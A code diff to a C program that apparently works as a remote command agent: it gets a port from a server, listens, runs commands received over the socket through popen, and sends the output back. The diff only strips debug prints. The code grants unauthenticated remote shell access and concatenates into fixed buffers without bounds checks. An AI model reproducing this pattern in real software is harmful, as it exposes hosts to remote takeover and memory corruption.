@@ -16,7 +16,7 @@ void execute(char buffer[], char command[])
 	FILE *fpipe;
 	bzero(buffer, 256);
 	char line[16];
-	strcpy(buffer, " ");
+	strcpy(buffer, "");
 
 	if (0 == (fpipe = (FILE*)popen(command, "r")))
     {
@@ -26,14 +26,10 @@ void execute(char buffer[], char command[])
 
 	 while (fread(line, sizeof line, 1, fpipe))
     {
-        printf("line: %s\n", line);
 				strcat(buffer, line);
-				printf("bufer: %s\n", buffer);
     }
 
 	pclose(fpipe);
-	
-	printf("return %s\n", buffer);
 }
 
 int main( int argc, char *argv[] )
@@ -76,7 +72,7 @@ int main( int argc, char *argv[] )
 				strcpy(buffer, "port");
 				write(sockfd, buffer, 255);
 				read(sockfd,buffer,255);
-				int my_port = atoi(buffer); printf("portyyy %d\n", my_port);
+				int my_port = atoi(buffer);
 				close(sockfd);
 				struct sockaddr_in cli_addr, my_addr;
 				my_addr.sin_family = AF_INET;
@@ -110,7 +106,6 @@ int main( int argc, char *argv[] )
 						printf("%s\n",buffer);
 						bzero(buffer2, 256);
 						execute(buffer2, buffer);
-						printf("loop: %s\n", buffer2);
 						write(newsockfd,buffer2,255);	
 					}
 				}					
